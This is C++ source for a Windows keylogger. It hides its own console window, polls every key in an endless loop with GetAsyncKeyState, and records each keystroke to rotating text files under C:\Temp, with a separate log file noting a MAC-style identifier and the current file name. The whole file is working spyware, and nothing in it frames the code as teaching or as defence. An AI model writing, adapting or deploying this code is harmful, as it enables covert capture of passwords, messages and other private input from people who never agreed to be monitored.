#include <iostream>
#include <windows.h>
#include <winuser.h>   
#include<string.h>
#include<stdlib.h>
using namespace std;

void file_name(char *old, int cnt);
void makelog(char *filename, char *macaddress);
int Save(int key_stroke, char *file);
void Stealth();

int main()
{
	char i, *mac = "00:03:FF";
	int j = 0, cnt = 0;
	char oldstr[14] = "C:\\Temp\\0.txt";
	Stealth();
	while (1)
	{
		for (i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767) {
				Save(i, oldstr);
				if (j >= 15) {
					cnt++;
					j = 0;
					makelog(oldstr, mac);
					if (cnt >= 10) cnt = 0;
					strcpy(oldstr, "C:\\Temp\\0.txt");
					file_name(oldstr, cnt);
				}
				else
					j++;
			}
		}
	}
	system("PAUSE");
	return 0;
}

void file_name(char *old, int cnt) //change notepad name, example 0.txt 1.txt ... 9.txt
{
	char *file_num = &old[8];
	for (int i = 0; i < cnt; i++)
		(*file_num)++;
}

void makelog(char *filename, char *macaddress)
{
	FILE *logf;
	logf = fopen("C:\\Temp\\log.txt", "w+");
	if (!logf)
	{
		printf("logfile open error\n");
		return;
	}
	fputs(macaddress, logf);
	fputc('\n', logf);
	fputs(filename, logf);
	fclose(logf);
}

int Save(int key_stroke, char *file)
{
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0;

	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");

	cout << key_stroke << endl;

	if (key_stroke == 8)
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (key_stroke == 13)
		fprintf(OUTPUT_FILE, "%s", "\n");
	else if (key_stroke == 32)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key_stroke == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (key_stroke == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
	else
		fprintf(OUTPUT_FILE, "%s", &key_stroke);
	fclose(OUTPUT_FILE);
	return 0;
}
void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}